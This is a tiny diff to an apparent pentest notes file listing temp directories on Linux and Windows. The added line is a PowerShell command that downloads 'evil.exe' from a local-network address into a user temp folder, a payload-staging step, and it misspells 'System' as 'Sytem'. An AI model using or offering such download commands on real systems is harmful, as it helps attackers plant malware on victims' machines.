@@ -1,2 +1,3 @@
 Linux : /tmp/
 Windows : c:\\windows\\temp
+Windows : powershell.exe (New-Object Sytem.Net.webClient).DownloadFile('http://192.168.1.1/evil.exe','C:\Users\Default\AppData\local\temp\evil.exe')
